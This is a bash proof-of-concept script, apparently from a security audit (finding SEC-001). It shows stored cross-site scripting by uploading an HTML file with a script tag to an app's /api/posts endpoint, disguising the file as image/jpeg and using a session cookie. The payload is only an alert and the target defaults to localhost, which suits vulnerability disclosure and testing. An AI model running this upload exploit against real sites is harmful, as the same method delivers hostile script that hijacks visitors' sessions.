#!/bin/bash
# SEC-001: Stored XSS via File Upload PoC
# Requirements: curl

TARGET=${TARGET_URL:-"http://localhost:5000"}
COOKIE=${AUTH_COOKIE}

if [ -z "$COOKIE" ]; then
    echo "Error: AUTH_COOKIE environment variable is required."
    echo "Usage: AUTH_COOKIE=... ./poc/SEC-001.sh"
    exit 1
fi

echo "[*] Creating malicious file..."
echo '<script>alert("XSS")</script>' > poc_exploit.html

echo "[*] uploading to $TARGET/api/posts..."
RESPONSE=$(curl -s -X POST "$TARGET/api/posts" \
  -H "Cookie: connect.sid=$COOKIE" \
  -F "title=Exploit" \
  -F "content=XSS PoC" \
  -F "category=general" \
  -F "file=@poc_exploit.html;type=image/jpeg")

echo "[*] Response:"
echo "$RESPONSE"

MEDIA_URL=$(echo "$RESPONSE" | grep -o '"mediaUrl":"[^"]*"' | cut -d'"' -f4)

if [ -n "$MEDIA_URL" ]; then
    echo ""
    echo "[+] Upload successful!"
    echo "[+] Exploit URL: $TARGET/uploads/$MEDIA_URL"
    echo "    (Note: The extension might be preserved as .html)"
else
    echo "[-] Upload failed or could not parse mediaUrl."
fi

rm poc_exploit.html
